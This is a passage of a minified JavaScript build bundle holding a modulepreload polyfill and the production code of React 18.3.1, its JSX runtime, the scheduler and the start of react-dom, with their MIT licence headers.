function Wd(e,n){for(var t=0;t<n.length;t++){const s=n[t];if(typeof s!="string"&&!Array.isArray(s)){for(const a in s)if(a!=="default"&&!(a in e)){const r=Object.getOwnPropertyDescriptor(s,a);r&&Object.defineProperty(e,a,r.get?r:{enumerable:!0,get:()=>s[a]})}}}return Object.freeze(Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}))}(function(){const n=document.createElement("link").relList;if(n&&n.supports&&n.supports("modulepreload"))return;for(const a of document.querySelectorAll('link[rel="modulepreload"]'))s(a);new MutationObserver(a=>{for(const r of a)if(r.type==="childList")for(const i of r.addedNodes)i.tagName==="LINK"&&i.rel==="modulepreload"&&s(i)}).observe(document,{childList:!0,subtree:!0});function t(a){const r={};return a.integrity&&(r.integrity=a.integrity),a.referrerPolicy&&(r.referrerPolicy=a.referrerPolicy),a.crossOrigin==="use-credentials"?r.credentials="include":a.crossOrigin==="anonymous"?r.credentials="omit":r.credentials="same-origin",r}function s(a){if(a.ep)return;a.ep=!0;const r=t(a);fetch(a.href,r)}})();function Vd(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var ic={exports:{}},Aa={},oc={exports:{}},D={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var ks=Symbol.for("react.element"),$d=Symbol.for("react.portal"),Gd=Symbol.for("react.fragment"),Kd=Symbol.for("react.strict_mode"),Yd=Symbol.for("react.profiler"),Xd=Symbol.for("react.provider"),Qd=Symbol.for("react.context"),Jd=Symbol.for("react.forward_ref"),Zd=Symbol.for("react.suspense"),ep=Symbol.for("react.memo"),np=Symbol.for("react.lazy"),Co=Symbol.iterator;function tp(e){return e===null||typeof e!="object"?null:(e=Co&&e[Co]||e["@@iterator"],typeof e=="function"?e:null)}var lc={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},cc=Object.assign,uc={};function Pt(e,n,t){this.props=e,this.context=n,this.refs=uc,this.updater=t||lc}Pt.prototype.isReactComponent={};Pt.prototype.setState=function(e,n){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,n,"setState")};Pt.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function dc(){}dc.prototype=Pt.prototype;function Li(e,n,t){this.props=e,this.context=n,this.refs=uc,this.updater=t||lc}var Ci=Li.prototype=new dc;Ci.constructor=Li;cc(Ci,Pt.prototype);Ci.isPureReactComponent=!0;var Po=Array.isArray,pc=Object.prototype.hasOwnProperty,Pi={current:null},hc={key:!0,ref:!0,__self:!0,__source:!0};function fc(e,n,t){var s,a={},r=null,i=null;if(n!=null)for(s in n.ref!==void 0&&(i=n.ref),n.key!==void 0&&(r=""+n.key),n)pc.call(n,s)&&!hc.hasOwnProperty(s)&&(a[s]=n[s]);var l=arguments.length-2;if(l===1)a.children=t;else if(1<l){for(var c=Array(l),u=0;u<l;u++)c[u]=arguments[u+2];a.children=c}if(e&&e.defaultProps)for(s in l=e.defaultProps,l)a[s]===void 0&&(a[s]=l[s]);return{$$typeof:ks,type:e,key:r,ref:i,props:a,_owner:Pi.current}}function sp(e,n){return{$$typeof:ks,type:e.type,key:n,ref:e.ref,props:e.props,_owner:e._owner}}function Ai(e){return typeof e=="object"&&e!==null&&e.$$typeof===ks}function ap(e){var n={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(t){return n[t]})}var Ao=/\/+/g;function Ya(e,n){return typeof e=="object"&&e!==null&&e.key!=null?ap(""+e.key):n.toString(36)}function Gs(e,n,t,s,a){var r=typeof e;(r==="undefined"||r==="boolean")&&(e=null);var i=!1;if(e===null)i=!0;else switch(r){case"string":case"number":i=!0;break;case"object":switch(e.$$typeof){case ks:case $d:i=!0}}if(i)return i=e,a=a(i),e=s===""?"."+Ya(i,0):s,Po(a)?(t="",e!=null&&(t=e.replace(Ao,"$&/")+"/"),Gs(a,n,t,"",function(u){return u})):a!=null&&(Ai(a)&&(a=sp(a,t+(!a.key||i&&i.key===a.key?"":(""+a.key).replace(Ao,"$&/")+"/")+e)),n.push(a)),1;if(i=0,s=s===""?".":s+":",Po(e))for(var l=0;l<e.length;l++){r=e[l];var c=s+Ya(r,l);i+=Gs(r,n,t,c,a)}else if(c=tp(e),typeof c=="function")for(e=c.call(e),l=0;!(r=e.next()).done;)r=r.value,c=s+Ya(r,l++),i+=Gs(r,n,t,c,a);else if(r==="object")throw n=String(e),Error("Objects are not valid as a React child (found: "+(n==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":n)+"). If you meant to render a collection of children, use an array instead.");return i}function Es(e,n,t){if(e==null)return e;var s=[],a=0;return Gs(e,s,"","",function(r){return n.call(t,r,a++)}),s}function rp(e){if(e._status===-1){var n=e._result;n=n(),n.then(function(t){(e._status===0||e._status===-1)&&(e._status=1,e._result=t)},function(t){(e._status===0||e._status===-1)&&(e._status=2,e._result=t)}),e._status===-1&&(e._status=0,e._result=n)}if(e._status===1)return e._result.default;throw e._result}var ye={current:null},Ks={transition:null},ip={ReactCurrentDispatcher:ye,ReactCurrentBatchConfig:Ks,ReactCurrentOwner:Pi};function mc(){throw Error("act(...) is not supported in production builds of React.")}D.Children={map:Es,forEach:function(e,n,t){Es(e,function(){n.apply(this,arguments)},t)},count:function(e){var n=0;return Es(e,function(){n++}),n},toArray:function(e){return Es(e,function(n){return n})||[]},only:function(e){if(!Ai(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};D.Component=Pt;D.Fragment=Gd;D.Profiler=Yd;D.PureComponent=Li;D.StrictMode=Kd;D.Suspense=Zd;D.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=ip;D.act=mc;D.cloneElement=function(e,n,t){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var s=cc({},e.props),a=e.key,r=e.ref,i=e._owner;if(n!=null){if(n.ref!==void 0&&(r=n.ref,i=Pi.current),n.key!==void 0&&(a=""+n.key),e.type&&e.type.defaultProps)var l=e.type.defaultProps;for(c in n)pc.call(n,c)&&!hc.hasOwnProperty(c)&&(s[c]=n[c]===void 0&&l!==void 0?l[c]:n[c])}var c=arguments.length-2;if(c===1)s.children=t;else if(1<c){l=Array(c);for(var u=0;u<c;u++)l[u]=arguments[u+2];s.children=l}return{$$typeof:ks,type:e.type,key:a,ref:r,props:s,_owner:i}};D.createContext=function(e){return e={$$typeof:Qd,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:Xd,_context:e},e.Consumer=e};D.createElement=fc;D.createFactory=function(e){var n=fc.bind(null,e);return n.type=e,n};D.createRef=function(){return{current:null}};D.forwardRef=function(e){return{$$typeof:Jd,render:e}};D.isValidElement=Ai;D.lazy=function(e){return{$$typeof:np,_payload:{_status:-1,_result:e},_init:rp}};D.memo=function(e,n){return{$$typeof:ep,type:e,compare:n===void 0?null:n}};D.startTransition=function(e){var n=Ks.transition;Ks.transition={};try{e()}finally{Ks.transition=n}};D.unstable_act=mc;D.useCallback=function(e,n){return ye.current.useCallback(e,n)};D.useContext=function(e){return ye.current.useContext(e)};D.useDebugValue=function(){};D.useDeferredValue=function(e){return ye.current.useDeferredValue(e)};D.useEffect=function(e,n){return ye.current.useEffect(e,n)};D.useId=function(){return ye.current.useId()};D.useImperativeHandle=function(e,n,t){return ye.current.useImperativeHandle(e,n,t)};D.useInsertionEffect=function(e,n){return ye.current.useInsertionEffect(e,n)};D.useLayoutEffect=function(e,n){return ye.current.useLayoutEffect(e,n)};D.useMemo=function(e,n){return ye.current.useMemo(e,n)};D.useReducer=function(e,n,t){return ye.current.useReducer(e,n,t)};D.useRef=function(e){return ye.current.useRef(e)};D.useState=function(e){return ye.current.useState(e)};D.useSyncExternalStore=function(e,n,t){return ye.current.useSyncExternalStore(e,n,t)};D.useTransition=function(){return ye.current.useTransition()};D.version="18.3.1";oc.exports=D;var w=oc.exports;const gc=Vd(w),op=Wd({__proto__:null,default:gc},[w]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var lp=w,cp=Symbol.for("react.element"),up=Symbol.for("react.fragment"),dp=Object.prototype.hasOwnProperty,pp=lp.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,hp={key:!0,ref:!0,__self:!0,__source:!0};function yc(e,n,t){var s,a={},r=null,i=null;t!==void 0&&(r=""+t),n.key!==void 0&&(r=""+n.key),n.ref!==void 0&&(i=n.ref);for(s in n)dp.call(n,s)&&!hp.hasOwnProperty(s)&&(a[s]=n[s]);if(e&&e.defaultProps)for(s in n=e.defaultProps,n)a[s]===void 0&&(a[s]=n[s]);return{$$typeof:cp,type:e,key:r,ref:i,props:a,_owner:pp.current}}Aa.Fragment=up;Aa.jsx=yc;Aa.jsxs=yc;ic.exports=Aa;var o=ic.exports,vc={exports:{}},Me={},wc={exports:{}},kc={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function n(T,_){var P=T.length;T.push(_);e:for(;0<P;){var M=P-1>>>1,R=T[M];if(0<a(R,_))T[M]=_,T[P]=R,P=M;else break e}}function t(T){return T.length===0?null:T[0]}function s(T){if(T.length===0)return null;var _=T[0],P=T.pop();if(P!==_){T[0]=P;e:for(var M=0,R=T.length,F=R>>>1;M<F;){var ke=2*(M+1)-1,Zn=T[ke],Ie=ke+1,Ts=T[Ie];if(0>a(Zn,P))Ie<R&&0>a(Ts,Zn)?(T[M]=Ts,T[Ie]=P,M=Ie):(T[M]=Zn,T[ke]=P,M=ke);else if(Ie<R&&0>a(Ts,P))T[M]=Ts,T[Ie]=P,M=Ie;else break e}}return _}function a(T,_){var P=T.sortIndex-_.sortIndex;return P!==0?P:T.id-_.id}if(typeof performance=="object"&&typeof performance.now=="function"){var r=performance;e.unstable_now=function(){return r.now()}}else{var i=Date,l=i.now();e.unstable_now=function(){return i.now()-l}}var c=[],u=[],f=1,p=null,g=3,v=!1,k=!1,y=!1,S=typeof setTimeout=="function"?setTimeout:null,m=typeof clearTimeout=="function"?clearTimeout:null,d=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function h(T){for(var _=t(u);_!==null;){if(_.callback===null)s(u);else if(_.startTime<=T)s(u),_.sortIndex=_.expirationTime,n(c,_);else break;_=t(u)}}function x(T){if(y=!1,h(T),!k)if(t(c)!==null)k=!0,X(b);else{var _=t(u);_!==null&&q(x,_.startTime-T)}}function b(T,_){k=!1,y&&(y=!1,m(A),A=-1),v=!0;var P=g;try{for(h(_),p=t(c);p!==null&&(!(p.expirationTime>_)||T&&!Z());){var M=p.callback;if(typeof M=="function"){p.callback=null,g=p.priorityLevel;var R=M(p.expirationTime<=_);_=e.unstable_now(),typeof R=="function"?p.callback=R:p===t(c)&&s(c),h(_)}else s(c);p=t(c)}if(p!==null)var F=!0;else{var ke=t(u);ke!==null&&q(x,ke.startTime-_),F=!1}return F}finally{p=null,g=P,v=!1}}var E=!1,C=null,A=-1,I=5,j=-1;function Z(){return!(e.unstable_now()-j<I)}function we(){if(C!==null){var T=e.unstable_now();j=T;var _=!0;try{_=C(!0,T)}finally{_?Le():(E=!1,C=null)}}else E=!1}var Le;if(typeof d=="function")Le=function(){d(we)};else if(typeof MessageChannel<"u"){var O=new MessageChannel,U=O.port2;O.port1.onmessage=we,Le=function(){U.postMessage(null)}}else Le=function(){S(we,0)};function X(T){C=T,E||(E=!0,Le())}function q(T,_){A=S(function(){T(e.unstable_now())},_)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(T){T.callback=null},e.unstable_continueExecution=function(){k||v||(k=!0,X(b))},e.unstable_forceFrameRate=function(T){0>T||125<T?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):I=0<T?Math.floor(1e3/T):5},e.unstable_getCurrentPriorityLevel=function(){return g},e.unstable_getFirstCallbackNode=function(){return t(c)},e.unstable_next=function(T){switch(g){case 1:case 2:case 3:var _=3;break;default:_=g}var P=g;g=_;try{return T()}finally{g=P}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(T,_){switch(T){case 1:case 2:case 3:case 4:case 5:break;default:T=3}var P=g;g=T;try{return _()}finally{g=P}},e.unstable_scheduleCallback=function(T,_,P){var M=e.unstable_now();switch(typeof P=="object"&&P!==null?(P=P.delay,P=typeof P=="number"&&0<P?M+P:M):P=M,T){case 1:var R=-1;break;case 2:R=250;break;case 5:R=1073741823;break;case 4:R=1e4;break;default:R=5e3}return R=P+R,T={id:f++,callback:_,priorityLevel:T,startTime:P,expirationTime:R,sortIndex:-1},P>M?(T.sortIndex=P,n(u,T),t(c)===null&&T===t(u)&&(y?(m(A),A=-1):y=!0,q(x,P-M))):(T.sortIndex=R,n(c,T),k||v||(k=!0,X(b))),T},e.unstable_shouldYield=Z,e.unstable_wrapCallback=function(T){var _=g;return function(){var P=g;g=_;try{return T.apply(this,arguments)}finally{g=P}}}})(kc);wc.exports=kc;var fp=wc.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var mp=w,Ne=fp;function L(e){for(var n="https://reactjs.org/docs/error-decoder.html?invariant="+e,t=1;t<arguments.length;t++)n+="&args[]="+encodeURIComponent(arguments[t]);return"Minified React error #"+e+"; visit "+n+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var bc=new Set,ns={};function Xn(e,n){bt(e,n),bt(e+"Capture",n)}function bt(e,n){for(ns[e]=n,e=0;e<n.length;e++)bc.add(n[e])}var cn=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Ar=Object.prototype.hasOwnProperty,gp=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,No={},Mo={};function yp(e){return Ar.call(Mo,e)?!0:Ar.call(No,e)?!1:gp.test(e)?Mo[e]=!0:(No[e]=!0,!1)}function vp(e,n,t,s){if(t!==null&&t.type===0)return!1;switch(typeof n){case"function":case"symbol":return!0;case"boolean":return s?!1:t!==null?!t.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function wp(e,n,t,s){if(n===null||typeof n>"u"||vp(e,n,t,s))return!0;if(s)return!1;if(t!==null)switch(t.type){case 3:return!n;case 4:return n===!1;case 5:return isNaN(n);case 6:return isNaN(n)||1>n}return!1}function ve(e,n,t,s,a,r,i){this.acceptsBooleans=n===2||n===3||n===4,this.attributeName=s,this.attributeNamespace=a,this.mustUseProperty=t,this.propertyName=e,this.type=n,this.sanitizeURL=r,this.removeEmptyString=i}var ce={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){ce[e]=new ve(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var n=e[0];ce[n]=new ve(n,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){ce[e]=new ve(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){ce[e]=new ve(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){ce[e]=new ve(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){ce[e]=new ve(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){ce[e]=new ve(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){ce[e]=new ve(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){ce[e]=new ve(e,5,!1,e.toLowerCase(),null,!1,!1)});var Ni=/[\-:]([a-z])/g;function Mi(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var n=e.replace(Ni,Mi);ce[n]=new ve(n,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var n=e.replace(Ni,Mi);ce[n]=new ve(n,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var n=e.replace(Ni,Mi);ce[n]=new ve(n,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){ce[e]=new ve(e,1,!1,e.toLowerCase(),null,!1,!1)});ce.xlinkHref=new ve("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){ce[e]=new ve(e,1,!1,e.toLowerCase(),null,!0,!0)});function ji(e,n,t,s){var a=ce.hasOwnProperty(n)?ce[n]:null;(a!==null?a.type!==0:s||!(2<n.length)||n[0]!=="o"&&n[0]!=="O"||n[1]!=="n"&&n[1]!=="N")&&(wp(n,t,a,s)&&(t=null),s||a===null?yp(n)&&(t===null?e.removeAttribute(n):e.setAttribute(n,""+t)):a.mustUseProperty?e[a.propertyName]=t===null?a.type===3?!1:"":t:(n=a.attributeName,s=a.attributeNamespace,t===null?e.removeAttribute(n):(a=a.type,t=a===3||a===4&&t===!0?"":""+t,s?e.setAttributeNS(s,n,t):e.setAttribute(n,t))))}var hn=mp.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,Ls=Symbol.for("react.element"),nt=Symbol.for("react.portal"),tt=Symbol.for("react.fragment"),Ii=Symbol.for("react.strict_mode"),Nr=Symbol.for("react.profiler"),xc=Symbol.for("react.provider"),Sc=Symbol.for("react.context"),qi=Symbol.for("react.forward_ref"),Mr=Symbol.for("react.suspense"),jr=Symbol.for("react.suspense_list"),Ri=Symbol.for("react.memo"),gn=Symbol.for("react.lazy"),_c=Symbol.for("react.offscreen"),jo=Symbol.iterator;function jt(e){return e===null||typeof e!="object"?null:(e=jo&&e[jo]||e["@@iterator"],typeof e=="function"?e:null)}var Y=Object.assign,Xa;function Ut(e){if(Xa===void 0)try{throw Error()}catch(t){var n=t.stack.trim().match(/\n( *(at )?)/);Xa=n&&n[1]||""}return`
`+Xa+e}var Qa=!1;function Ja(e,n){if(!e||Qa)return"";Qa=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(n)if(n=function(){throw Error()},Object.defineProperty(n.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(n,[])}catch(u){var s=u}Reflect.construct(e,[],n)}else{try{n.call()}catch(u){s=u}e.call(n.prototype)}else{try{throw Error()}catch(u){s=u}e()}}catch(u){if(u&&s&&typeof u.stack=="string"){for(var a=u.stack.split(`
`),r=s.stack.split(`
`),i=a.length-1,l=r.length-1;1<=i&&0<=l&&a[i]!==r[l];)l--;for(;1<=i&&0<=l;i--,l--)if(a[i]!==r[l]){if(i!==1||l!==1)do if(i--,l--,0>l||a[i]!==r[l]){var c=`
`+a[i].replace(" at new "," at ");return e.displayName&&c.includes("<anonymous>")&&(c=c.replace("<anonymous>",e.displayName)),c}while(1<=i&&0<=l);break}}}finally{Qa=!1,Error.prepareStackTrace=t}return(e=e?e.displayName||e.name:"")?Ut(e):""}function kp(e){switch(e.tag){case 5:return Ut(e.type);case 16:return Ut("Lazy");case 13:return Ut("Suspense");case 19:return Ut("SuspenseList");case 0:case 2:case 15:return e=Ja(e.type,!1),e;case 11:return e=Ja(e.type.render,!1),e;case 1:return e=Ja(e.type,!0),e;default:return""}}function Ir(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case tt:return"Fragment";case nt:return"Portal";case Nr:return"Profiler";case Ii:return"StrictMode";case Mr:return"Suspense";case jr:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case Sc:return(e.displayName||"Context")+".Consumer";case xc:return(e._context.displayName||"Context")+".Provider";case qi:var n=e.render;return e=e.displayName,e||(e=n.displayName||n.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case Ri:return n=e.displayName||null,n!==null?n:Ir(e.type)||"Memo";case gn:n=e._payload,e=e._init;try{return Ir(e(n))}catch{}}return null}function bp(e){var n=e.type;switch(e.tag){case 24:return"Cache";case 9:return(n.displayName||"Context")+".Consumer";case 10:return(n._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=n.render,e=e.displayName||e.name||"",n.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return n;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return Ir(n);case 8:return n===Ii?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof n=="function")return n.displayName||n.name||null;if(typeof n=="string")return n}return null}function Mn(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function Tc(e){var n=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(n==="checkbox"||n==="radio")}function xp(e){var n=Tc(e)?"checked":"value",t=Object.getOwnPropertyDescriptor(e.constructor.prototype,n),s=""+e[n];if(!e.hasOwnProperty(n)&&typeof t<"u"&&typeof t.get=="function"&&typeof t.set=="function"){var a=t.get,r=t.set;return Object.defineProperty(e,n,{configurable:!0,get:function(){return a.call(this)},set:function(i){s=""+i,r.call(this,i)}}),Object.defineProperty(e,n,{enumerable:t.enumerable}),{getValue:function(){return s},setValue:function(i){s=""+i},stopTracking:function(){e._valueTracker=null,delete e[n]}}}}function Cs(e){e._valueTracker||(e._valueTracker=xp(e))}function Ec(e){if(!e)return!1;var n=e._valueTracker;if(!n)return!0;var t=n.getValue(),s="";return e&&(s=Tc(e)?e.checked?"true":"false":e.value),e=s,e!==t?(n.setValue(e),!0):!1}function ia(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function qr(e,n){var t=n.checked;return Y({},n,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:t??e._wrapperState.initialChecked})}function Io(e,n){var t=n.defaultValue==null?"":n.defaultValue,s=n.checked!=null?n.checked:n.defaultChecked;t=Mn(n.value!=null?n.value:t),e._wrapperState={initialChecked:s,initialValue:t,controlled:n.type==="checkbox"||n.type==="radio"?n.checked!=null:n.value!=null}}function Lc(e,n){n=n.checked,n!=null&&ji(e,"checked",n,!1)}function Rr(e,n){Lc(e,n);var t=Mn(n.value),s=n.type;if(t!=null)s==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+t):e.value!==""+t&&(e.value=""+t);else if(s==="submit"||s==="reset"){e.removeAttribute("value");return}n.hasOwnProperty("value")?Or(e,n.type,t):n.hasOwnProperty("defaultValue")&&Or(e,n.type,Mn(n.defaultValue)),n.checked==null&&n.defaultChecked!=null&&(e.defaultChecked=!!n.defaultChecked)}function qo(e,n,t){if(n.hasOwnProperty("value")||n.hasOwnProperty("defaultValue")){var s=n.type;if(!(s!=="submit"&&s!=="reset"||n.value!==void 0&&n.value!==null))return;n=""+e._wrapperState.initialValue,t||n===e.value||(e.value=n),e.defaultValue=n}t=e.name,t!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,t!==""&&(e.name=t)}function Or(e,n,t){(n!=="number"||ia(e.ownerDocument)!==e)&&(t==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+t&&(e.defaultValue=""+t))}var Ht=Array.isArray;function ft(e,n,t,s){if(e=e.options,n){n={};for(var a=0;a<t.length;a++)n["$"+t[a]]=!0;for(t=0;t<e.length;t++)a=n.hasOwnProperty("$"+e[t].value),e[t].selected!==a&&(e[t].selected=a),a&&s&&(e[t].defaultSelected=!0)}else{for(t=""+Mn(t),n=null,a=0;a<e.length;a++){if(e[a].value===t){e[a].selected=!0,s&&(e[a].defaultSelected=!0);return}n!==null||e[a].disabled||(n=e[a])}n!==null&&(n.selected=!0)}}function Dr(e,n){if(n.dangerouslySetInnerHTML!=null)throw Error(L(91));return Y({},n,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function Ro(e,n){var t=n.value;if(t==null){if(t=n.children,n=n.defaultValue,t!=null){if(n!=null)throw Error(L(92));if(Ht(t)){if(1<t.length)throw Error(L(93));t=t[0]}n=t}n==null&&(n=""),t=n}e._wrapperState={initialValue:Mn(t)}}function Cc(e,n){var t=Mn(n.value),s=Mn(n.defaultValue);t!=null&&(t=""+t,t!==e.value&&(e.value=t),n.defaultValue==null&&e.defaultValue!==t&&(e.defaultValue=t)),s!=null&&(e.defaultValue=""+s)}function Oo(e){var n=e.textContent;n===e._wrapperState.initialValue&&n!==""&&n!==null&&(e.value=n)}function Pc(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function zr(e,n){return e==null||e==="http://www.w3.org/1999/xhtml"?Pc(n):e==="http://www.w3.org/2000/svg"&&n==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var Ps,Ac=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(n,t,s,a){MSApp.execUnsafeLocalFunction(function(){return e(n,t,s,a)})}:e}(function(e,n){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=n;else{for(Ps=Ps||document.createElement("div"),Ps.innerHTML="<svg>"+n.valueOf().toString()+"</svg>",n=Ps.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;n.firstChild;)e.appendChild(n.firstChild)}});function ts(e,n){if(n){var t=e.firstChild;if(t&&t===e.lastChild&&t.nodeType===3){t.nodeValue=n;return}}e.textContent=n}var $t={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Sp=["Webkit","ms","Moz","O"];Object.keys($t).forEach(function(e){Sp.forEach(function(n){n=n+e.charAt(0).toUpperCase()+e.substring(1),$t[n]=$t[e]})});function Nc(e,n,t){return n==null||typeof n=="boolean"||n===""?"":t||typeof n!="number"||n===0||$t.hasOwnProperty(e)&&$t[e]?(""+n).trim():n+"px"}function Mc(e,n){e=e.style;for(var t in n)if(n.hasOwnProperty(t)){var s=t.indexOf("--")===0,a=Nc(t,n[t],s);t==="float"&&(t="cssFloat"),s?e.setProperty(t,a):e[t]=a}}var 